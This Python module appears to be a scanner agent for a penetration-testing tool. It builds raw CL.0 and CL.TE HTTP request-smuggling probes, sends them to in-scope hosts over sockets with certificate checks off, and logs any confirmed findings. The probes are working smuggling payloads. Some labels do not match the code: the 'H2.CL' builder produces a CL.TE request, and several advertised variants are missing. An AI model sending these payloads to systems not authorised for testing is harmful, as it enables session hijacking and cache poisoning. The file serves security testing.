"""DesyncAgent — HTTP/1.1 request smuggling: CL.0, H2.CL, 0.CL, client-side."""
from __future__ import annotations

import asyncio
import socket
import time
import uuid
from pathlib import Path
from urllib.parse import urlparse

from app.agents.base import BaseAgent
from app.agents.orchestrator import register_agent
from app.config import settings
from app.db.models import Finding, FindingStatus, Severity

_PROMPT_PATH = Path(__file__).parent.parent / "prompts" / "desync.md"


async def _tcp_send_recv(host: str, port: int, data: bytes, ssl: bool = True, timeout: float = 10.0) -> bytes:
    """Low-level TCP send/recv with TCP_NODELAY for single-packet attack."""
    loop = asyncio.get_event_loop()

    def _do() -> bytes:
        import ssl as _ssl
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.settimeout(timeout)
        try:
            s.connect((host, port))
            if ssl:
                ctx = _ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = _ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            s.sendall(data)
            resp = b""
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
            except (socket.timeout, OSError):
                pass
            return resp
        finally:
            try:
                s.close()
            except Exception:
                pass

    return await loop.run_in_executor(None, _do)


def _build_cl0_probe(host: str, path: str = "/") -> bytes:
    """CL.0 probe: HEAD with Content-Length claiming a smuggled GET."""
    return (
        f"HEAD {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 30\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"GET /ZWAN_CANARY HTTP/1.1\r\nX: x"
    ).encode()


def _build_h2cl_probe(host: str, path: str = "/") -> bytes:
    """H2.CL probe via HTTP/1.1 upgrade (simplified)."""
    body = "GET /ZWAN_CANARY HTTP/1.1\r\nHost: {}\r\n\r\n".format(host)
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"0\r\n\r\n"
        f"{body}"
    ).encode()


@register_agent
class DesyncAgent(BaseAgent):
    name = "desync"

    async def _execute(self) -> dict:
        system_prompt = _PROMPT_PATH.read_text()
        scope_urls: list[str] = self.engagement.scope_urls
        confirmed: list[dict] = []

        for url in scope_urls:
            parsed = urlparse(url if "://" in url else f"https://{url}")
            host = parsed.hostname or ""
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            ssl = parsed.scheme == "https"
            path = parsed.path or "/"

            await self._emit("trace", {"message": f"Desync probe: {host}"})

            # CL.0 probe
            try:
                t0 = time.time()
                probe = _build_cl0_probe(host, path)
                resp = await _tcp_send_recv(host, port, probe, ssl=ssl, timeout=8)
                elapsed = time.time() - t0
                resp_text = resp.decode(errors="replace")

                if "ZWAN_CANARY" in resp_text:
                    finding = {
                        "variant": "CL.0",
                        "host": host,
                        "path": path,
                        "probe": probe.decode(errors="replace"),
                        "response_excerpt": resp_text[:500],
                        "elapsed_s": round(elapsed, 2),
                        "severity": "high",
                        "description": f"CL.0 desync confirmed on {host}{path}. Server ignores Content-Length, allowing request prefix injection.",
                    }
                    confirmed.append(finding)
                    await self._emit("trace", {"message": f"CL.0 CONFIRMED on {host}"})

                elif elapsed > 6:
                    await self._emit("trace", {"message": f"CL.0 timing anomaly {host} ({elapsed:.1f}s) — manual verify"})

            except Exception as e:
                await self._emit("trace", {"message": f"CL.0 probe error {host}: {e}"})

            # CLTE probe (Transfer-Encoding conflict)
            try:
                probe = _build_h2cl_probe(host, path)
                t0 = time.time()
                resp = await _tcp_send_recv(host, port, probe, ssl=ssl, timeout=8)
                elapsed = time.time() - t0
                resp_text = resp.decode(errors="replace")

                if "ZWAN_CANARY" in resp_text:
                    finding = {
                        "variant": "CL.TE",
                        "host": host,
                        "path": path,
                        "severity": "high",
                        "description": f"CL.TE desync confirmed on {host}. Transfer-Encoding and Content-Length conflict enables request smuggling.",
                        "response_excerpt": resp_text[:500],
                    }
                    confirmed.append(finding)
                    await self._emit("trace", {"message": f"CL.TE CONFIRMED on {host}"})

            except Exception as e:
                await self._emit("trace", {"message": f"CL.TE probe error {host}: {e}"})

        # Persist confirmed findings
        for item in confirmed:
            sev = Severity.HIGH if item["severity"] == "high" else Severity.CRITICAL
            finding = Finding(
                id=str(uuid.uuid4()),
                engagement_id=self.engagement.id,
                title=f"HTTP Request Smuggling ({item['variant']}) — {item['host']}",
                severity=sev,
                status=FindingStatus.PENDING,
                cvss_score=8.1,
                cvss_vector="CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N",
                description=item["description"],
                reproducer=item.get("probe", ""),
                impact="Request smuggling enables session hijacking, cache poisoning, and access to internal endpoints.",
                http_transcript=item.get("probe", "") + "\n\n" + item.get("response_excerpt", ""),
                meta=item,
            )
            self.db.add(finding)
        await self.db.commit()

        await self._emit("trace", {"message": f"Desync scan complete. {len(confirmed)} confirmed."})
        return {"confirmed": len(confirmed), "findings": confirmed}
